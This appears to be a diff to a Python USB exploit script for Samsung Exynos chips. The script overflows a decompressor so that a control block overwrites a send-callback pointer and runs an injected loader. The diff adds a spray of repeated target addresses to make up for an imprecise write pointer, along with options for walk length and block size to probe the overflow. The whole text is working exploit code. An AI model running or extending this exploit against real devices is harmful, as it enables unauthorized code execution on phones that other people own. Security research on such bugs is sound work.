@@ -193,11 +193,16 @@ def load_bundle(path):
     return data
 
 
-def invoke(dev, dst, target, reply, timeout=30000):
-    ctl = bytearray(CTL_LEN)
-    struct.pack_into("<Q", ctl, 0, reply)
-    struct.pack_into("<Q", ctl, CB_OFF, target)
-    return put_comp(dev, len(ctl), dst, bytes(ctl), timeout)
+def invoke(dev, dst, target, reply, timeout=30000, span=None):
+    """Send the control block that lands on the send-callback global.
+
+    span > 8 fills a window of `span` bytes with the target repeated, so a
+    small error in where the decompressor's write pointer ends up still
+    overwrites the global.
+    """
+    span = CTL_LEN if span is None else span
+    ctl = struct.pack(f"<{span // 8}Q", *([target] * (span // 8)))
+    return put_comp(dev, len(ctl), dst, ctl, timeout)
 
 
 def branch(pc, target, link=False):
@@ -251,9 +256,9 @@ def context():
     return bytes(data)
 
 
-def walk(dev, dst, left, done, total, mark):
+def walk(dev, dst, left, done, total, mark, step=None):
     while left:
-        size = min(left, BLOCK)
+        size = min(left, step or BLOCK)
         put_comp(dev, size, dst)
         left -= size
         done += size
@@ -263,11 +268,12 @@ def walk(dev, dst, left, done, total, mark):
     return done, mark
 
 
-def run(code_path, bundle_path):
+def run(code_path, bundle_path, walk_len=None, span=None, block=None):
     code = code_path.read_bytes()
     bundle = load_bundle(bundle_path)
     if not code or len(code) > CODE_MAX or CODE_OFF + len(code) > 0x1000:
         raise RuntimeError("loader size")
+    walk_len = WALK_LEN if walk_len is None else walk_len
 
     dev = open_usb()
     try:
@@ -307,13 +313,15 @@ def run(code_path, bundle_path):
 
         cmd(dev, 100, 5, (8,))
         cmd(dev, 102, 5)
-        walk(dev, scratch, WALK_LEN, 0, WALK_LEN, 0x4000000)
+        walk(dev, scratch, walk_len, 0, walk_len, 0x4000000, block)
 
-        print(f"trigger {WRITE_ADDR:#x}", flush=True)
+        print(f"trigger {WRITE_ADDR + (walk_len - WALK_LEN):#x}", flush=True)
         start = time.monotonic()
         target = CONTEXT_RESTORE or CODE_ADDR
         reply = CONTEXT_ADDR or REPLY_ADDR
-        ret = invoke(dev, boot, target, reply, 600000)
+        ret = invoke(dev, boot, target, reply, 600000, span)
+        took = time.monotonic() - start
+        print(f"invoke {took:.3f}s -> {ret:#x}", flush=True)
         if ret != RESULT_OK:
             raise RuntimeError(f"loader {ret:#x}")
         print(f"done {time.monotonic() - start:.1f}s", flush=True)
@@ -330,10 +338,19 @@ def main():
                     choices=("s5e8825", "s5e9925", "s5e9945"))
     ap.add_argument("code", type=Path, nargs="?", default=ROOT / "loader.bin")
     ap.add_argument("--bundle", type=Path, default=ROOT / "loader/bundle.bin")
+    ap.add_argument("--walk", type=lambda v: int(v, 0), default=None,
+                    help="override WALK_LEN (short walks probe out_base cheaply)")
+    ap.add_argument("--span", type=lambda v: int(v, 0), default=None,
+                    help="control-block window size; target repeated every 8 bytes")
+    ap.add_argument("--block", type=lambda v: int(v, 0), default=None,
+                    help="walk block size (one oversized block tests the overflow)")
     args = ap.parse_args()
     if args.soc != SOC:
         raise ValueError(f"generated loader is for {SOC}, not {args.soc}")
-    run(args.code.resolve(), args.bundle.resolve())
+    if args.span is not None and (args.span < 8 or args.span % 8):
+        raise ValueError("--span must be a positive multiple of 8")
+    run(args.code.resolve(), args.bundle.resolve(), args.walk, args.span,
+        args.block)
 
 
 if __name__ == "__main__":
